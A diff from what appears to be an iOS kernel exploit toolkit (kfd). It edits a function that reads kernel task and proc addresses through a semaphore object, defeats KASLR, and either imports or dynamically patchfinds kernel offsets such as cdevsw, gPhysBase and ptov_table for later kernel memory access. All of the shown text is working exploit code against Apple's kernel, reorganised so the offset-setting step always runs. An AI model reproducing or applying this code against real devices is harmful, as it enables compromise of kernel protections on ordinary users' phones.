@@ -100,9 +100,10 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     u64 pseminfo_kaddr = pnode->pinfo;
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
+    
 
-    bool DEFEAT_KASLR = true;
-    if(DEFEAT_KASLR) {
+    bool EXPERIMENTAL_DYNAMIC_PATCHFINDER = true;
+    if(import_kfd_offsets() == -1 && EXPERIMENTAL_DYNAMIC_PATCHFINDER) {
         //Step 1. break kaslr
         printf("kernel_task: 0x%llx\n", task_kaddr);
         
@@ -142,18 +143,18 @@ void kread_sem_open_find_proc(struct kfd* kfd)
         
         //Step 2. run dynamic patchfinder
         do_dynamic_patchfinder((u64)kfd, kbase);
-        
-        //Step 3. set offsets from dynamic patchfinder.
-        kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
-        kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
-        kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
-        kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
-        kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
-        kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
-        kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
-        kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
-        kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
     }
+    
+    //Step 3. set offsets from patchfinder or import_kfd_offsets().
+    kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
+    kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
+    kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
+    kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
+    kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
+    kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
+    kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
+    kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
+    kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
         
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
     kfd->info.kaddr.kernel_proc = proc_kaddr;
